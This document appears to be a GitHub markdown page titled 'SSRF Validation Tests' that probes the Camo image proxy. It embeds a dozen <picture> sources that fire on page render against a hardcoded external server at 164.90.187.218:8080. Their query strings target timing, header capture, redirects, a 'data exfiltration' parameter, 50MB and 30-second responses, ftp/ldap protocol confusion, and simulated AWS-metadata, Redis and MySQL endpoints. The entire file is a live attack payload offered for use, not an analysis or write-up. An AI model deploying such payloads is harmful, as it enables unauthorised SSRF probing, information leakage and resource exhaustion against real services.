# 🔍 SSRF Validation Tests

Testing GitHub Camo proxy SSRF vulnerability.

## Basic SSRF Confirmation
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-1-basic">
  <img src="hellp.jpg" alt="Basic Test">
</picture>

## Timing Attack Test  
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-2-timing?delay=10">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Timing Test">
</picture>

## Data Exfiltration Test
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-3-data?data=github-internal-secret">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Data Test">
</picture>

## Header Analysis Test
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-4-headers">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Header Test">
</picture>

## Redirect Following Test
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-5-redirect?step=1">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Redirect Test">
</picture>

## Large Response Test (50MB)
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-6-large?size=50">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Large Test">
</picture>

## Slow Response Test (30s)
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-7-slow?duration=30">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Slow Test">
</picture>

## Protocol Confusion Tests
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-8-protocols?protocol=ftp">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="FTP Test">
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-8-protocols?protocol=ldap">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="LDAP Test">
</picture>

## Internal Service Simulation
<picture>
  <source srcset="http://164.90.187.218:8080/simulate-internal?service=aws-metadata">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="AWS Test">
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/simulate-internal?service=redis-info">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Redis Test">
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/simulate-internal?service=mysql-status">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="MySQL Test">
</picture>
